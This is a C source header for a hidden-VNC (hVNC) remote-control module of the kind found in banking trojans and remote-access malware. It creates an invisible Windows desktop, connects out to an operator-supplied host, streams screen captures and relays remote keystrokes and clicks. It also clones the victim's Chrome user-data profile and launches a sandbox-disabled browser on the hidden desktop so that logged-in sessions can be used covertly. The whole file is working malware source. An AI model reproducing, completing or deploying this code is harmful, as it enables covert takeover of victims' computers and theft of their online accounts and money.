#ifndef HVNC_INCL
#define HVNC_INCL
#include <stdio.h>
#include <windows.h>
#include <stdlib.h>
#include <string.h>
#include <shlwapi.h>
#include <time.h>
#include "../utils/jpeg.h"
#include "socks.h"
#define DESKTOP_NAME "haxxordesktop12345"
//for tcc purposes, these apis seem to be lacked
typedef int WINAPI(*d_RealGetWindowClassA)(HWND a, LPSTR b, UINT c);
d_RealGetWindowClassA GetWindowClassA;
typedef int WINAPI(*d_PWindow)(HWND a, HDC b, UINT c);
d_PWindow PWindow;

static void run(char* desktop_name, char* path){
    STARTUPINFOA startup_info = {0};
    PROCESS_INFORMATION process_info = {0};
    startup_info.cb = sizeof(startup_info);
    startup_info.lpDesktop = desktop_name;
    CreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startup_info, &process_info);
}
static void start_explorer(char* desktop_name){
    STARTUPINFOA startup_info = {0};
    PROCESS_INFORMATION process_info = {0};
    startup_info.cb = sizeof(startup_info);
    startup_info.lpDesktop = desktop_name;
    CHAR explorer_path[MAX_PATH];
    ExpandEnvironmentStringsA("%windir%\\explorer.exe", explorer_path, MAX_PATH-1);
    CreateProcessA(explorer_path, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &startup_info, &process_info);
}
static void CopyDir(char *from, char *to){
    char fromWildCard[MAX_PATH] = { 0 };
    strcpy(fromWildCard, from);
    strcat(fromWildCard, "\\*");

    if(!CreateDirectoryA(to, NULL) && GetLastError() != ERROR_ALREADY_EXISTS)
        return;
    
    WIN32_FIND_DATAA findData;
    HANDLE hFindFile = FindFirstFileA(fromWildCard, &findData);
    if(hFindFile == INVALID_HANDLE_VALUE)
        return;

    do {
        char currFileFrom[MAX_PATH] = { 0 };
        strcpy(currFileFrom, from);
        strcat(currFileFrom, "\\");
        strcat(currFileFrom, findData.cFileName);

        char currFileTo[MAX_PATH] = { 0 };
        strcpy(currFileTo, to);
        strcat(currFileTo, "\\");
        strcat(currFileTo, findData.cFileName);

        if ((findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && strcmp(findData.cFileName, ".")!=0 && strcmp(findData.cFileName, "..")!=0){
            if(CreateDirectoryA(currFileTo, NULL) || GetLastError() == ERROR_ALREADY_EXISTS)
                CopyDir(currFileFrom, currFileTo);
        }else{
            CopyFileA(currFileFrom, currFileTo, FALSE);
        }
    } while(FindNextFileA(hFindFile, &findData));
}
static double factor;
static HDESK dsk;
static int sendframeh = 0;
static int fullfh = 0;
static void inputthdh(char* desktop_name){
    SetThreadDesktop(dsk);
    HANDLE hwd = GetTopWindow(NULL);
    while(1){
        char* data = hvnc_sock_recv();
        if(data==NULL) return;
        if(data[0]==0x69){ //keypress
            int keycode = 0;
            memcpy(&keycode, data+1, 4);
            PostMessage(hwd, WM_KEYDOWN, keycode, 0 );
        }else if(data[0]==0x72){ //mouseup
            int x = 0;
            int y = 0;
            memcpy(&x, data+1, 4);
            memcpy(&y, data+5, 4);
            POINT point;
            point.x = (int)(((double)x)/factor);
            point.y = (int)(((double)y)/factor);
            LPARAM lParam = MAKELPARAM(point.x, point.y);
            hwd = WindowFromPoint(point);
            
            for (HWND currHwnd = hwd;;){
                hwd = currHwnd;
                ScreenToClient(hwd, &point);
                currHwnd = ChildWindowFromPoint(hwd, point);
                if (currHwnd == NULL || currHwnd == hwd)
                    break;
            }
            lParam = MAKELPARAM(point.x, point.y);
            PostMessage(hwd, WM_LBUTTONUP, 0, lParam);
        }else if(data[0]==0x71){ //mousedown
            int x = 0;
            int y = 0;
            memcpy(&x, data+1, 4);
            memcpy(&y, data+5, 4);
            POINT point;
            point.x = (int)(((double)x)/factor);
            point.y = (int)(((double)y)/factor);
            LPARAM lParam = MAKELPARAM(point.x, point.y);
            hwd = WindowFromPoint(point);
		    RECT startButtonRect;
		    HWND hStartButton = FindWindowA("Button", NULL);
		    GetWindowRect(hStartButton, &startButtonRect);
		    if (PtInRect(&startButtonRect, point)){
			    PostMessageA(hStartButton, BM_CLICK, 0, 0);
			    continue;
		    }else{
			    char windowClass[MAX_PATH] = { 0 };
			    GetWindowClassA(hwd, windowClass, MAX_PATH);
			    if (strcmp(windowClass, "#32768") == 0){
				    HMENU hMenu = (HMENU)SendMessageA(hwd, MN_GETHMENU, 0, 0);
				    int itemPos = MenuItemFromPoint(NULL, hMenu, point);
				    int itemId = GetMenuItemID(hMenu, itemPos);
				    PostMessageA(hwd, 0x1e5, itemPos, 0);
				    PostMessageA(hwd, WM_KEYDOWN, VK_RETURN, 0);
				    continue;
			    }
		    }
		    LRESULT lResult = SendMessageA(hwd, WM_NCHITTEST, 0, lParam);

            switch (lResult){
                case HTTRANSPARENT:
                {
                    SetWindowLongA(hwd, GWL_STYLE, GetWindowLongA(hwd, GWL_STYLE) | WS_DISABLED);
                    fullfh = 1;
                    break;
                }
                case HTCLOSE:
                {
                    PostMessageA(hwd, WM_CLOSE, 0, 0);
                    fullfh = 1;
                    break;
                }
                case HTMINBUTTON:
                {
                    PostMessageA(hwd, WM_SYSCOMMAND, SC_MINIMIZE, 0);
                    fullfh = 1;
                    break;
                }
                case HTMAXBUTTON:
                {
                    WINDOWPLACEMENT windowPlacement;
                    windowPlacement.length = sizeof(windowPlacement);
                    GetWindowPlacement(hwd, &windowPlacement);
                    if (windowPlacement.flags & SW_SHOWMAXIMIZED)
                        PostMessageA(hwd, WM_SYSCOMMAND, SC_RESTORE, 0);
                    else
                        PostMessageA(hwd, WM_SYSCOMMAND, SC_MAXIMIZE, 0);
                    fullfh = 1;
                    break;
                }
            }
            for (HWND currHwnd = hwd;;){
                hwd = currHwnd;
                ScreenToClient(hwd, &point);
                currHwnd = ChildWindowFromPoint(hwd, point);
                if (currHwnd == NULL || currHwnd == hwd)
                    break;
            }
            lParam = MAKELPARAM(point.x, point.y);
            //printf("%d %d\n", point.x, point.y);
            PostMessage(hwd, WM_LBUTTONDOWN, 0, lParam);
            
        }else if(data[0]==0x67){
            fullfh = 1;
        }else if(data[0]==0x73){ //chrome
        	char chromePath[MAX_PATH] = { 0 };
            GetEnvironmentVariableA("APPDATA", chromePath, MAX_PATH);
            chromePath[strlen(chromePath)-7] = 0;
            strcat(chromePath, "Local\\Google\\Chrome\\");

            char dataPath[MAX_PATH] = { 0 };
            strcpy(dataPath, chromePath);
            strcat(dataPath, "User Data");

            char botId[100] = "User Profiles";
            char newDataPath[MAX_PATH] = { 0 };
            strcpy(newDataPath, chromePath);
            
            strcat(newDataPath, botId);
            if(!PathFileExistsA(newDataPath))
                CopyDir(dataPath, newDataPath);

            char path[1024] = { 0 };
            strcpy(path, "cmd.exe /c start chrome.exe --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --user-data-dir=\"");
            strcat(path, newDataPath);
            strcat(path, "\"");

            run(desktop_name, path);
        }
        sendframeh = 1;
        free(data);
    }
}
int hvnc(NETWORK* net){
    //scaling detect implementation
    GetWindowClassA = (d_RealGetWindowClassA)GetProcAddress(GetModuleHandleA("user32"), "RealGetWindowClassA");
    PWindow = (d_PWindow)GetProcAddress(GetModuleHandleA("user32"), "PrintWindow");
    HWND topw = GetWindow(GetTopWindow(NULL), GW_HWNDLAST);
    int maxrt = 0;
    int maxbt = 0;
    while(topw != NULL){
        RECT rect2;
        GetClientRect(topw, &rect2);
        if(rect2.right>maxrt)
            maxrt = rect2.right;
        if(rect2.bottom>maxbt)
            maxbt = rect2.bottom;
        topw = GetWindow(topw, GW_HWNDPREV);
    }
    
    HWND hDeskMain = GetDesktopWindow();
    RECT rect3;
    GetWindowRect(hDeskMain, &rect3);
    
    double dx = ((double)maxrt)/((double)rect3.right);
    double dy = ((double)maxbt)/((double)rect3.bottom);
    if(dx>dy) factor = dx;
    else factor = dy;
    srand(time(NULL));
    char desktop_name[1000];
    sprintf(desktop_name, "%s%d", DESKTOP_NAME, rand());
    dsk = OpenDesktopA(desktop_name, 0, FALSE, GENERIC_ALL);
    if(dsk==NULL){
        dsk = CreateDesktopA(desktop_name, NULL, NULL, 0, GENERIC_ALL, NULL);
        start_explorer(desktop_name);
    }
    SetThreadDesktop(dsk);
    Sleep(1000);
    hvnc_sock_init(net->ip, net->port);
    HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)inputthdh, desktop_name, 0, NULL);
    HWND hDesk = GetDesktopWindow();
    RECT rect;
    GetWindowRect(hDesk, &rect);
    HDC hdc = GetDC(NULL);
    
    rect.right *= factor;
    rect.bottom *= factor;
    //printf("%f\n", factor);
    unsigned char* pastbm = calloc(10000000, 1);
    unsigned char* bitmap;
    while(!sendframeh) Sleep(100);
    while(1){
        Sleep(200);
        HDC memdc = CreateCompatibleDC(hdc);
        HBITMAP hbitmap = CreateCompatibleBitmap(hdc, rect.right, rect.bottom);
        SelectObject(memdc, hbitmap);
        
        HWND curw = GetWindow(GetTopWindow(NULL), GW_HWNDLAST);
        HWND ocurw = curw;
        while(curw != NULL){
            if(IsWindowVisible(curw))
                SetWindowLongA(curw, GWL_EXSTYLE, GetWindowLongA(curw, GWL_EXSTYLE) | WS_EX_COMPOSITED);
            curw = GetWindow(curw, GW_HWNDPREV);
        }
        Sleep(50);
        curw = ocurw;
        while(curw != NULL){
            if(!IsWindowVisible(curw)) goto next;
            RECT wRect;
            GetWindowRect(curw, &wRect);
            HDC wdc = CreateCompatibleDC(hdc);
            HBITMAP wbitmap = CreateCompatibleBitmap(hdc, rect.right - rect.left, rect.bottom - rect.top);
            SelectObject(wdc, wbitmap);
            wRect.right *= factor;
            wRect.bottom *= factor;
            wRect.left *= factor;
            wRect.top *= factor;
            
            if (PWindow(curw, wdc, 0))
                BitBlt(memdc, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, wdc, 0, 0, SRCCOPY);
            SetWindowLongA(curw, GWL_EXSTYLE, GetWindowLongA(curw, GWL_EXSTYLE) & (~WS_EX_COMPOSITED));
            DeleteObject(wbitmap);
            DeleteDC(wdc);
        next:
            curw = GetWindow(curw, GW_HWNDPREV);
        }
        bitmap = calloc(10000000, 1);
        DWORD cb = GetBitmapBits(hbitmap, 10000000, bitmap);
        int bpb = cb/(rect.right*rect.bottom);
        int top = 0;
        int topset = 0;
        int left = rect.right;
        int bot = 0;
        int right = 0;
        if(fullfh){
            memset(pastbm, 0, 10000000);
            fullfh = 0;
        }
        for(int i=0;i<cb;i+=bpb){
            if(memcmp(pastbm+i, bitmap+i, bpb)!=0){
                int y = i/(bpb*rect.right);
                if(!topset){
                    top = y;
                    topset = 1;
                }
                int x = (i/bpb)%rect.right;
                if(x<left) left = x;
                if(x>right) right = x;
                if(y>bot) bot = y;
            }
        }
        if(left==rect.right) left=0;
        bot++;
        right++;
        if(bot>rect.bottom) bot = rect.bottom;
        if(right>rect.right) right = rect.right;
        free(pastbm);
        
        HDC hNew = CreateCompatibleDC(hdc);
        HBITMAP hBmp = CreateCompatibleBitmap(hdc, right - left, bot - top); 
        SelectObject(hNew, hBmp);
        BitBlt(hNew, 0, 0, right - left, bot - top, memdc, left, top, SRCCOPY);
        DeleteObject(hbitmap);
        DeleteDC(memdc);
        pastbm = bitmap;
        int sz = 0;
        char* jpg = bmptojpg(hBmp, &sz);
        DeleteObject(hBmp);
        DeleteDC(hNew);
        if(hvnc_sock_send(jpg, sz, left, top)) break;
    }
    free(bitmap);
    free(net->ip);
    free(net);
    CloseDesktop(dsk);
}
#endif